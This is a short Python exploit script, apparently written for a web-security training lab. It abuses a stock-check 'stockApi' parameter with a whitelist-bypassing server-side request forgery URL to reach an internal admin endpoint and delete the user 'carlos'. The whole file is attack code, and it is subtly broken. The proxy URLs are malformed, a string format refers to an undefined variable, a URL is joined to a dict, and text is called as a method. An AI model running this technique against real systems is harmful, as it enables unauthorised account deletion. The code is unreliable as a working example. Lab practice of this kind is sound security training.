import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def delete_user(url):
    delete_user_url_ssrf_payload ='http://localhost%2523@stockweliketoshop.net/admin/delete?username=carlos' %admin_ip_address
    check_stock_path_url = '/product/stock'
    parameters = {'stockApi':delete_user_url_ssrf_payload}
    r = requests.get(url + check_stock_path_url, data=parameters, verify=False, proxies=proxies)
    #check if user has been deleted or not 
    admin_csrf_payload = 'http://localhost%2523@stockweliketoshop.net/admin'
    admin_parameters = {'stockApi':admin_csrf_payload}
    r = requests.post(url + admin_parameters, data=admin_parameters, verify=False, proxies=proxies)
    if 'Carlos' not in r.text():
        print("(+) User Carlos is deleted successfully")
    else:
        print("(+) Could not delete user successfully")
        
def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    url = sys.argv[1]
    print("(+) Deleting the carlos user...")
    delete_user(url)

if __name__ == '__main__':
    main() 